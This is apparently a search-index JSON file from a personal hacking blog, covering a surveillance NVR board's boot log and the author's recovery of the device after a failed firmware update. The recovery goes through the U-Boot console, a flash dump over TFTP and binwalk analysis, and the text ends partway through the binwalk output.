{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Home","text":""},{"location":"#welcome","title":"Welcome!","text":"<p>This site started as a place for me to post writeups as I studied for the OSCP.</p> <p>In Sept 2022 I finally passed the exam and earned the OSCP!</p> <p>Now, this is a place for me to post random stuff as I learn and grow as a hacker :) I hope you enjoy it.</p>"},{"location":"IoT/nightowl/nvr/","title":"ssr21q_v102_nvr04","text":"<p>This board can be found in some cheap surveillance camera NVRs such as this one or this one.</p>"},{"location":"IoT/nightowl/nvr/#boot-log","title":"Boot log","text":"<pre><code>IPL g8e04b60\nD-1f\nHW Reset\nmiupll_233MHz\nMIU0 zq=0x003a\nmiu_bw_set\nutmi_1_init done\nutmi_2_init done\nutmi_3_init done\nusbpll init done......\nSPI 54M\nclk_init done \nP1 USB_rterm trim=0x000d\nP1 USB_HS_TX_CURRENT trim=0x0001\nP2 USB_rterm trim=0x000d\nP2 USB_HS_TX_CURRENT trim=0x000d\nP3 USB_rterm trim=0x000d\nP3 USB_HS_TX_CURRENT trim=0x000d\nPM_vol_bgap trim=0x0004\nGCR_SAR_DATA trim=0x0193\nETH 10T output swing trim=0x0010\nETH 100T output swing trim=0x0011\nETH RX input impedance trim=0x0000\nETH TX output impedance trim=0x0000\nMIPI_HS_RTERM trim=0x0001\nMIPI_LP_RTERM trim=0x0000\nTX_current trimming trim[0x1A]=0x0048\nTX_current trimming trim[0x1B]=0x004a\nTX_current trimming trim[0x1C]=0x004a\nHDMI2TX Rterm trim=0x001f\nHDMI2TX_Ibias_CH0 trim=0x001c\nHDMI2TX_Ibias_CH1 trim=0x001b\nHDMI2TX_Ibias_CH2 trim=0x001a\nHDMI2TX_Ibias_CH3 trim=0x001a\n256MB\nBIST0_0001-OK\nEnable MMU and CACHE\nLoad IPL_CUST from NOR\noffset:00010000\nUnable to detect NOR\nLoad time 682 us, 25900 KiB/s\ncrc OK\n\nIPL_CUST g8e04b60\nMXP found at 0x00020000\nrunUBOOT()\nrunUBOOT()\n[SPI_NOR]\n -Verify UBOOT CRC32 passed!\n -Decompress UBOOT XZ\n  decomp_size=0x00081788\nDisable MMU and D-cache before jump to UBOOT\ufffd\n\nU-Boot 2015.01 (Aug 12 2020 - 10:21:49)\n\nVersion: I2g45a386a\nI2C:   ready\nDRAM:  \nWARNING: Caches not enabled\ngpio debug MHal_GPIO_Pad_Set: pin=44\ngpio debug MHal_GPIO_Pad_Set: pin=17\ngpio debug MHal_GPIO_Pad_Set: pin=18\ngpio debug MHal_GPIO_Pad_Set: pin=39\nnor_flash_mxp allocated success!!\nFlash is detected (0x1003, 0x20, 0x70, 0x18)\nSF: Detected nor0 with total size 16 MiB\nMXP found at mxp_offset[3]=0x00020000, size=0x1000\nenv_offset=0x60000 env_size=0x10000\nFlash is detected (0x1003, 0x20, 0x70, 0x18)\nSF: Detected nor0 with total size 16 MiB\nIn:    serial\nOut:   serial\nErr:   serial\nNet:   MAC Address 00:32:65:00:00:04\nAuto-Negotiation...\nAN failLink Status Speed:10 Full-duplex:0\nStatus Error!\nsstar_emac\nBootLogo IN(234f8eb0 40000), OUT(f700000, 800000), DISP(1280 1024 60), Interface:1\n_BootLogoHdmitxCtrl 3258\nFlash is detected (0x1003, 0x20, 0x70, 0x18)\nSF: Detected nor0 with total size 16 MiB\nSF: 2621440 bytes @ 0x70000 Read: OK\n##  Booting kernel from Legacy Image at 22000000 ...\n   Image Name:   MVX4##I2M#g45a386aKL_LX409##[BR:\n   Image Type:   ARM Linux Kernel Image (lzma compressed)\n   Data Size:    2608976 Bytes = 2.5 MiB\n   Load Address: 20008000\n   Entry Point:  20008000\n   Verifying Checksum ... OK\n-usb_stop(USB_PORT0)\n-usb_stop(USB_PORT1)\n-usb_stop(USB_PORT2)\n   Uncompressing Kernel Image ... \n[XZ] !!!reserved 0x21000000 length=0x 1000000 for xz!!\n   XZ: uncompressed size=0x51f000, ret=7\nOK\natags:0x20000000\n\nStarting kernel ...\n\nBooting Linux on physical CPU 0x0\nLinux version 4.9.84 (root@linux) (gcc version 4.9.4 (Buildroot 2017.08-gc7bbae9-dirty) ) #1 SMP PREEMPT Thu Jul 16 15:20:27 CST 2020\nCPU: ARMv7 Processor [410fc075] revision 5 (ARMv7), cr=50c5387d\nCPU: div instructions available: patching division code\nCPU: PIPT / VIPT nonaliasing data cache, VIPT aliasing instruction cache\nearly_atags_to_fdt() success\nOF: fdt:Machine model: INFINITY2M SSC010A-S01A-S\nLXmem is 0xff00000 PHYS_OFFSET is 0x20000000\nAdd mem start 0x20000000 size 0xff00000!!!!\n\nLX_MEM  = 0x20000000, 0xff00000\nLX_MEM2 = 0x0, 0x0\nLX_MEM3 = 0x0, 0x0\nEMAC_LEN= 0x0\nDRAM_LEN= 0x0\nno any mmap reserved\ndeal_with_reserve_mma_heap memblock_reserve success mma_config[0].reserved_start=\n0x24500000\n\ndeal_with_reserve_mma_heap memblock_reserve success mma_config[1].reserved_start=\n0x2d000000\n\ncma: Reserved 2 MiB at 0x2ce00000\nMemory policy: Data cache writealloc\npercpu: Embedded 14 pages/cpu @ccc1d000 s24920 r8192 d24232 u57344\nBuilt 1 zonelists in Zone order, mobility grouping on.  Total pages: 37728\nKernel command line: console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=squashfs ro init=/linuxrc LX_MEM=0xff00000 mma_heap=MMU_MMA,miu=0,sz=0x3B00000 mma_heap=mma_heap_name0,miu=0,sz=0x2F00000 mma_memblock_remove=1\nPID hash table entries: 1024 (order: 0, 4096 bytes)\nDentry cache hash table entries: 32768 (order: 5, 131072 bytes)\nInode-cache hash table entries: 16384 (order: 4, 65536 bytes)\nMemory: 143440K/152576K available (3098K kernel code, 279K rwdata, 1520K rodata, 180K init, 170K bss, 7088K reserved, 2048K cma-reserved)\nVirtual kernel memory layout:\n    vector  : 0xffff0000 - 0xffff1000   (   4 kB)\n    fixmap  : 0xffc00000 - 0xfff00000   (3072 kB)\n    vmalloc : 0xcd800000 - 0xff800000   ( 800 MB)\n    lowmem  : 0xc0000000 - 0xcd000000   ( 208 MB)\n    modules : 0xbf800000 - 0xc0000000   (   8 MB)\n      .text : 0xc0008000 - 0xc030edb8   (3100 kB)\n      .init : 0xc04b3000 - 0xc04e0000   ( 180 kB)\n      .data : 0xc04e0000 - 0xc0525ff8   ( 280 kB)\n       .bss : 0xc0527000 - 0xc0551b50   ( 171 kB)\nSLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1\nPreemptible hierarchical RCU implementation.\n    Build-time adjustment of leaf fanout to 32.\n    RCU restricting CPUs from NR_CPUS=4 to nr_cpu_ids=2.\nRCU: Adjusting geometry for rcu_fanout_leaf=32, nr_cpu_ids=2\nNR_IRQS:16 nr_irqs:16 16\nms_init_main_intc: np-&gt;name=ms_main_intc, parent=gic\nms_init_pm_intc: np-&gt;name=ms_pm_intc, parent=ms_main_intc\nss_init_gpi_intc: np-&gt;name=ms_gpi_intc, parent=ms_main_intc\nFind CLK_cpupll_clk, hook ms_cpuclk_ops\narm_arch_timer: Architected cp15 timer(s) running at 6.00MHz (virt).\nclocksource: arch_sys_counter: mask: 0xffffffffffffff max_cycles: 0x1623fa770, max_idle_ns: 440795202238 ns\nsched_clock: 56 bits at 6MHz, resolution 166ns, wraps every 4398046511055ns\nSwitching to timer-based delay loop, resolution 166ns\nConsole: colour dummy device 80x30\nconsole [ttyS0] enabled\nCalibrating delay loop (skipped), value calculated using timer frequency.. 12.00 BogoMIPS (lpj=60000)\npid_max: default: 4096 minimum: 301\nMount-cache hash table entries: 1024 (order: 0, 4096 bytes)\nMountpoint-cache hash table entries: 1024 (order: 0, 4096 bytes)\nCPU: Testing write buffer coherency: ok\nCPU0: update cpu_capacity 1024\nCPU0: thread -1, cpu 0, socket 0, mpidr 80000000\nSetting up static identity map for 0x20008240 - 0x20008270\nCPU1: update cpu_capacity 1024\nCPU1: thread -1, cpu 1, socket 0, mpidr 80000001\nBrought up 2 CPUs\nSMP: Total of 2 processors activated (24.00 BogoMIPS).\nCPU: All CPU(s) started in SVC mode.\ndevtmpfs: initialized\nVFP support v0.3: implementor 41 architecture 2 part 30 variant 7 rev 5\nclocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 19112604462750000 ns\nfutex hash table entries: 16 (order: -2, 1024 bytes)\nNET: Registered protocol family 16\nDMA: preallocated 256 KiB pool for atomic coherent allocations\n\n\nVersion : MVX4##I2M#g45a386aKL_LX409##[BR:ssr621_20200522]#XVM\n\nGPIO: probe end[ss_gpi_intc_domain_alloc] hw:42 -&gt; v:45\n[MS_PM_INTC] hw:20 -&gt; v:53\nhw-breakpoint: found 5 (+1 reserved) breakpoint and 4 watchpoint registers.\nhw-breakpoint: maximum watchpoint size is 8 bytes.\nSCSI subsystem initialized\nusbcore: registered new interface driver usbfs\nusbcore: registered new interface driver hub\nusbcore: registered new device driver usb\nclocksource: Switched to clocksource arch_sys_counter\nNET: Registered protocol family 2\nTCP established hash table entries: 2048 (order: 1, 8192 bytes)\nTCP bind hash table entries: 2048 (order: 3, 40960 bytes)\nTCP: Hash tables configured (established 2048 bind 2048)\nUDP hash table entries: 128 (order: 0, 6144 bytes)\nUDP-Lite hash table entries: 128 (order: 0, 6144 bytes)\nNET: Registered protocol family 1\nRPC: Registered named UNIX socket transport module.\nRPC: Registered udp transport module.\nRPC: Registered tcp transport module.\nRPC: Registered tcp NFSv4.1 backchannel transport module.\nhw perfevents: enabled with armv7_cortex_a7 PMU driver, 5 counters available\nworkingset: timestamp_bits=30 max_order=16 bucket_order=0\nsquashfs: version 4.0 (2009/01/31) Phillip Lougher\njffs2: version 2.2. \ufffd 2001-2006 Red Hat, Inc.\nio scheduler noop registered\nio scheduler deadline registered (default)\nlibphy: Fixed MDIO Bus: probed\nPPP generic driver version 2.4.2\nPPP BSD Compression module registered\nPPP Deflate Compression module registered\nPPP MPPE Compression module registered\nNET: Registered protocol family 24\nehci_hcd: USB 2.0 'Enhanced' Host Controller (EHCI) Driver\nMstar_ehc_init version:20180309\nSstar-ehci-2 H.W init\nCHIP_FUNCTION SET. ID=4, param=65537\nTitania3_series_start_ehc start\n[USB] config miu select [70] [e8] [ef] [ef]\n[USB] enable miu lower bound address subtraction\n[USB] init squelch level 0x2\n[USB] no platform_data, device tree coming\n[USB][EHC] dma coherent_mask 0xffffffffffffffff mask 0xffffffffffffffff\nBC disable \n[USB] soc:Sstar-ehci-2 irq --&gt; 40\nSstar-ehci-2 soc:Sstar-ehci-2: EHCI Host Controller\nSstar-ehci-2 soc:Sstar-ehci-2: new USB bus registered, assigned bus number 1\nSstar-ehci-2 soc:Sstar-ehci-2: irq 40, io mem 0xfd285000\nusb usb1: New USB device found, idVendor=1d6b, idProduct=0002\nusb usb1: New USB device strings: Mfr=3, Product=2, SerialNumber=1\nusb usb1: Product: EHCI Host Controller\nusb usb1: Manufacturer: Linux 4.9.84 ehci_hcd\nusb usb1: SerialNumber: mstar\nhub 1-0:1.0: USB hub found\nhub 1-0:1.0: 1 port detected\nSstar-ehci-1 H.W init\nCHIP_FUNCTION SET. ID=4, param=1\nTitania3_series_start_ehc start\n[USB] config miu select [70] [e8] [ef] [ef]\n[USB] enable miu lower bound address subtraction\n[USB] init squelch level 0x2\n[USB] no platform_data, device tree coming\n[USB][EHC] dma coherent_mask 0xffffffffffffffff mask 0xffffffffffffffff\nBC disable \n[USB] soc:Sstar-ehci-1 irq --&gt; 39\nSstar-ehci-1 soc:Sstar-ehci-1: EHCI Host Controller\nSstar-ehci-1 soc:Sstar-ehci-1: new USB bus registered, assigned bus number 2\nSstar-ehci-1 soc:Sstar-ehci-1: irq 39, io mem 0xfd284800\nusb usb2: New USB device found, idVendor=1d6b, idProduct=0002\nusb usb2: New USB device strings: Mfr=3, Product=2, SerialNumber=1\nusb usb2: Product: EHCI Host Controller\nusb usb2: Manufacturer: Linux 4.9.84 ehci_hcd\nusb usb2: SerialNumber: mstar\nhub 2-0:1.0: USB hub found\nhub 2-0:1.0: 1 port detected\nSstar-ehci-3 H.W init\nCHIP_FUNCTION SET. ID=4, param=131073\nTitania3_series_start_ehc start\n[USB] config miu select [70] [e8] [ef] [ef]\n[USB] enable miu lower bound address subtraction\n[USB] init squelch level 0x2\n[USB] no platform_data, device tree coming\n[USB][EHC] dma coherent_mask 0xffffffffffffffff mask 0xffffffffffffffff\nBC disable \n[USB] soc:Sstar-ehci-3 irq --&gt; 57\nSstar-ehci-3 soc:Sstar-ehci-3: EHCI Host Controller\nSstar-ehci-3 soc:Sstar-ehci-3: new USB bus registered, assigned bus number 3\nSstar-ehci-3 soc:Sstar-ehci-3: irq 57, io mem 0xfd286400\nusb usb3: New USB device found, idVendor=1d6b, idProduct=0002\nusb usb3: New USB device strings: Mfr=3, Product=2, SerialNumber=1\nusb usb3: Product: EHCI Host Controller\nusb usb3: Manufacturer: Linux 4.9.84 ehci_hcd\nusb usb3: SerialNumber: mstar\nhub 3-0:1.0: USB hub found\nhub 3-0:1.0: 1 port detected\nusbcore: registered new interface driver cdc_wdm\nusbcore: registered new interface driver usb-storage\nmousedev: PS/2 mouse device common for all mice\n==20180309==&gt; hub_port_init 1 #0\nPlug in USB Port2\ni2c /dev entries driver\nusbcore: registered new interface driver usbhid\nusbhid: USB HID core driver\n1f221000.uart0: ttyS0 at MMIO 0x0 (irq = 31, base_baud = 10800000) is a unknown\n1f221200.uart1: ttyS1 at MMIO 0x0 (irq = 32, base_baud = 10800000) is a unknown\n1f220400.uart2: ttyS2 at MMIO 0x0 (irq = 34, base_baud = 10800000) is a unknown\n1f221400.uart2: ttyS3 at MMIO 0x0 (irq = 35, base_baud = 10800000) is a unknown\n[Core Voltage] check_voltage_valid: Not support 0mV, use 850mV\nMSYS: DMEM request: [emac0_buff]:0x00000812\nMSYS: DMEM request: [emac0_buff]:0x00000812 success, CPU phy:@0x2CE4D000, virt:@0xCCE4D000\nlibphy: mdio: probed\nmdio_bus mdio-bus@emac0: /soc/emac0/mdio-bus@emac0/ethernet-phy@0 has invalid PHY address\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 0\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 1\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 2\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 3\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 4\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 5\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 6\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 7\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 8\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 9\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 10\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 11\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 12\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 13\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 14\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 15\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 16\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 17\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 18\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 19\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 20\nusb 1-1: new high-speed USB device number 2 using Sstar-ehci-2\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 21\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 22\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 23\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 24\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 25\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 26\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 27\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 28\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 29\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 30\nmdio_bus mdio-bus@emac0: scan phy ethernet-phy at address 31\n[emac_phy_connect][3169] connected mac emac0 to PHY at mdio-bus@emac0:00 [uid=11112222, driver=SStar 10/100 Ethernet Phy]\nMSYS: DMEM request: [emac1_buff]:0x00062812\nMSYS: DMEM request: [emac1_buff]:0x00062812 success, CPU phy:@0x2CE50000, virt:@0xCCE50000\nlibphy: mdio: probed\nmdio_bus mdio-bus@emac1: /soc/emac1/mdio-bus@emac1/ethernet-phy@1 has invalid PHY address\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 0\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 1\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 2\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 3\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 4\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 5\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 6\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 7\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 8\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 9\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 10\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 11\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 12\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 13\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 14\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 15\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 16\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 17\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 18\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 19\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 20\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 21\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 22\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 23\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 24\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 25\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 26\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 27\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 28\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 29\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 30\nmdio_bus mdio-bus@emac1: scan phy ethernet-phy at address 31\n[emac_phy_connect][3169] connected mac emac1 to PHY at mdio-bus@emac1:00 [uid=00000000, driver=Generic PHY]\nusb 1-1: New USB device found, idVendor=0bda, idProduct=f192\nusb 1-1: New USB device strings: Mfr=1, Product=2, SerialNumber=3\nRegistered IR keymap rc-mstar-dtv\ninput: mstar ir as /devices/virtual/rc/rc0/input0\nrc rc0: mstar ir as /devices/virtual/rc/rc0\nusb 1-1: Product: 802.11n  WLAN Adapter\nusb 1-1: Manufacturer: Realtek\nusb 1-1: SerialNumber: 00e04c000001\nms_rtcpwc 1f006800.rtcpwc: rtc core: registered 1f006800.rtcpwc as rtc0\nMSYS: DMEM request: [BDMA_FSP_WBUFF]:0x00010040\nMSYS: DMEM request: [BDMA_FSP_WBUFF]:0x00010040 success, CPU phy:@0x2CEC0000, virt:@0xCCEC0000\n[Ser flash] phys=0x2cec0000, virt=0xccec0000, bus=0x0cec0000 len:0x10040\n[FSP] Flash is detected (0x1003, 0x20, 0x70, 0x18) ver1.1\n[FSP] 1-1-4 QUAD_READ MODE\nmtd .name = NOR_FLASH, .size = 0x01000000 (16MiB)\n .erasesize = 0x00010000 .numeraseregions = 0\nMXP_PARTS!!\nMXP found at mxp_offset[3]=0x00020000, size=0x1000\nCreating 9 MTD partitions on \"NOR_FLASH\":\n0x000000000000-0x000000060000 : \"BOOT\"\n0x000000060000-0x000000070000 : \"UBOOT_ENV\"\n0x000000070000-0x0000002f0000 : \"KERNEL\"\n0x0000002f0000-0x0000003f0000 : \"ROOTFS\"\n0x0000003f0000-0x000000ef0000 : \"APP\"\n0x000000ef0000-0x000000f30000 : \"LOGO\"\n0x000000f30000-0x000000fe0000 : \"CONFIG\"\n0x000000fe0000-0x000000ff0000 : \"ODM\"\n0x000000ff0000-0x000001000000 : \"ID\"\n[ms_cpufreq_init] Current clk=998244352\n[ahci_sstar_probe] , priv-&gt;res_ahci_port0 =0xfd345100 \n[ahci_sstar_probe] , priv-&gt;res_ahci_misc =0xfd2a4a00 \n[SATA] phy_mode =0\nSATA_TX_R50 trim=0x000F\nSATA_RX_R50 trim=0x000F\nSATA_TX_R50_IBIAS trim=0x0019\nSATA_RXPLL_ICTRL_CDR trim=0x0003\n[SATA0] Clock : ON\nsstar sata HW settings done!!!\n[SATA] phy_mode =0\nahci_sstar 1f345000.sata: AHCI 0001.0300 32 slots 1 ports 6 Gbps 0x1 impl platform mode\nahci_sstar 1f345000.sata: flags: ncq sntf pm led clo only pmp fbs pio slum part ccc apst \nahci_sstar 1f345000.sata: port 0 is not capable of FBS\nscsi host0: ahci_sstar\nata1: SATA max UDMA/133 mmio [mem 0x1f345000-0x1f3450ff] port 0x100 irq 51\n[ahci_sstar_probe] , SSTAR AHCI SATA registered \nInitializing XFRM netlink socket\nNET: Registered protocol family 17\nNET: Registered protocol family 15\n8021q: 802.1Q VLAN Support v1.8\nsctp: Hash tables configured (bind 128/204)\nThumbEE CPU extension supported.\nRegistering SWP/SWPB emulation handler\nms_rtcpwc 1f006800.rtcpwc: setting system clock to 2023-09-20 03:10:38 UTC (1695179438)\nOF: fdt:not creating '/sys/firmware/fdt': CRC check failed\nata1: SATA link down (SStatus 0 SControl 300)\nVFS: Mounted root (squashfs filesystem) readonly on device 31:3.\ndevtmpfs: mounted\nThis architecture does not have kernel memory protection.\nrandom: linuxrc: uninitialized urandom read (4 bytes read)\nrandom: sh: uninitialized urandom read (4 bytes read)\nrandom: mount: uninitialized urandom read (4 bytes read)\nrandom: S00devs: uninitialized urandom read (4 bytes read)\nrandom: mknod: uninitialized urandom read (4 bytes read)\nrandom: mknod: uninitialized urandom read (4 bytes read)\nrandom: mknod: uninitialized urandom read (4 bytes read)\nrandom: S01udev: uninitialized urandom read (4 bytes read)\nrandom: mkdir: uninitialized urandom read (4 bytes read)\nrandom: mount: uninitialized urandom read (4 bytes read)\nupgrade version: Aug  1 2020 17:10:48\nmount dir('/media/usb1') isn't exist now!\ncheck sda...\nsda... not found\ncheck sdb...\nsdb... not found\ncheck sdc...\nsdc... not found\ncheck sdd...\nsdd... not found\ncheck sde...\nsde... not found\ncheck sdf...\nsdf... not found\ncheck sdg...\nsdg... not found\ncheck sdh...\nsdh... not found\ncheck sdi...\nsdi... not found\ncheck sdj...\nsdj... not found\ncheck sdk...\nsdk... not found\ncheck sdl...\nsdl... not found\nenable log not found.\nenable log2 not found.\n163840\n163840\n1514\nmhal: loading out-of-tree module taints kernel.\nmhal: module license 'PROPRIETARY' taints kernel.\nDisabling lock debugging due to kernel taint\nmhal driver init\njpe driver probed\nmodule [sys] init\nMI_SYSCFG_SetupMmapLoader default_config_path:/config/config_tool, argv1:/config/load_mmap,argv2:/config/mmap.ini\nFunction = init_glob_miu_kranges, Line = 603, Insert KProtect for LX @ MIU: 0\nFunction = init_glob_miu_kranges, Line = 612, [INIT] for LX0 kprotect: from 0x20000000 to 0x2FF00000, using block 0\nconfig...... strPath:/config/config_tool, argv0:/config/load_config\nfunction:parese_Cmdline,pCmd_Section:0xff00000\nMM\nU_\nMM\nA    miu=0,sz=3b00000  reserved_start=24500000\nr_front-&gt;miuBlockIndex:0,r_front-&gt;start_cpu_bus_pa:0x20000000,r_front-&gt;start_cpu_bus_pa+r_front-&gt;length:0x24500000\nr_back-&gt;miuBlockIndex:1,r_back-&gt;start_cpu_bus_pa:0x28000000,r_back-&gt;start_cpu_bus_pa+r_back-&gt;length:0x2ff00000\nmi_sys_mma_allocator_create success, heap_base_addr=24500000 length=3b00000 \nmm\na_\nhe\nap\n_n\nam\ne0\n    miu=0,sz=2f00000  reserved_start=2d000000\nr_front-&gt;miuBlockIndex:1,r_front-&gt;start_cpu_bus_pa:0x28000000,r_front-&gt;start_cpu_bus_pa+r_front-&gt;length:0x2d000000\nmi_sys_mma_allocator_create success, heap_base_addr=2d000000 length=2f00000 \nKernel CONFIG_HZ = 100\nSigmastar Module version: project_commit.8456c3c sdk_commit.ec18ae1 build_time.20200707145953\nmodule [ai] init\nmodule [ao] init\nmodule [gfx] init\nmodule [divp] init\nmodule [disp] init\nmodule [hdmi] init\nmodule [vdec] init\nmodule [vdisp] init\nmodule [venc] init Jul  7 2020 15:00:16\n[GOP]HalGopUpdateGwinParam 718: GOP_id=011 not support\n[GOP]HalGopSetArgb1555Alpha 1203: GOPId=0x11 not support\n[GOP]HalGopSetArgb1555Alpha 1203: GOPId=0x11 not support\ninsert juan mod\nbridge: filtering via arp/ip/ip6tables is no longer available by default. Update your scripts to load br_netfilter if you need this.\nEbtables v2.0 registered\nsh: bad number\ndaemon server build:Apr 15 2020, 17:10:08  net port:8925\nActive thread listen in port:9025\nnCreate idx = 1 1\nnCreate idx = 0 0\n[ error] [0.022s] FLASH: [odm_read_all: 683] ODM OPEN /dev/mtdblock7 ...\n[  info] [0.059s] APP: [NK_PRODUCT_Init: 842] BuildData3\n[  info] [0.060s] APP: [NK_PRODUCT_Init: 844] BuildData Done3\nplay_cam = 4\nMAX_CAM:10 max_bnc_cam:0 play_cam=4\n</code></pre>"},{"location":"IoT/nightowl/nvr/#breaking-the-device","title":"Breaking the device","text":"<p>I unplugged this device at 99% complete during an OTA upgrade which caused UBoot unable to load Linux</p> <pre><code>Wrong Image Format for bootm command\nERROR: can't get kernel image!\n</code></pre>"},{"location":"IoT/nightowl/nvr/#saving-the-device","title":"Saving the device","text":"<p>The U-Boot console can be accessed ovar UART by holding down the Return/Enter key during boot.</p>"},{"location":"IoT/nightowl/nvr/#printenv","title":"printenv","text":"<pre><code>SigmaStar # printenv\n\nUpgradeImage=SigmastarUpgrade.bin\nbaudrate=115200\nbootargs=console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=squashfs ro init=/linuxrc LX_MEM=0xff00000 mma_heap=MMU_MMA,miu=0,sz=0x3B00000 mma_heap=mma_heap_name0,miu=0,sz=0x2F00000 mma_memblock_remove=1\nbootcmd=${s10};${s11};${s12};${s13};\nbootdelay=0\nbootm_failed=1\ncpu_part_start=1425e000\nethact=sstar_emac\nethaddr=00:32:65:00:00:04\nfileaddr=235cc190\nfilesize=143\nipaddr=192.168.1.114\nnetmask=255.255.0.0\ns10=bootlogo\ns11=sf probe 0\ns12=sf read 0x22000000 0x70000 0x280000\ns13=bootm 0x22000000\ns21=bzr 200 1\ns22=bzr 55 2\ns23=usb start 2\ns24=fatload usb 0 0x22000000 help.rom\ns41=bzr 55 2\ns42=bzr 500 1\ns43=bzr 500 4\ns44=reset\nserverip=192.168.1.1\nsf_kernel_size=280000\nsf_kernel_start=70000\nsf_part_size=40000\nsf_part_start=ef0000\nstderr=serial\nstdin=serial\nstdout=serial\nusb_folder=images\n\nEnvironment size: 913/4092 bytes\n</code></pre>"},{"location":"IoT/nightowl/nvr/#figuring-out-whats-fucked-up","title":"Figuring out what's fucked up","text":"<p>Probe the SPI</p> <pre><code>sf probe 0\n</code></pre> <p>Dump the SPI to a .bin file on TFTP server</p> <pre><code>sfbin 0x22000000 0x00 &lt;ip&gt;:&lt;filename&gt;\n</code></pre> <p>Examine the dump. looking for Kernel</p> <pre><code>binwalk &lt;filename&gt;\n</code></pre> <pre><code>DECIMAL \u00a0 \u00a0 \u00a0 HEXADECIMAL \u00a0 \u00a0 DESCRIPTION \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0\n\n---------------------------------------------------------------------------\n81051 \u00a0 \u00a0 \u00a0 \u00a0 0x13C9B \u00a0 \u00a0 \u00a0 \u00a0 xz compressed data\u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 81428 \u00a0 \u00a0 \u00a0 \u00a0 0x13E14 \u00a0 \u00a0 \u00a0 \u00a0 CRC32 polynomial table, little endian \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 \u00a0 196608\u00a0 \u00a0 \u00a0 \u00a0 0x30000 \u00a0 \u00a0 \u00a0 \u00a0 uImage header, header size: 64 bytes, header CRC: 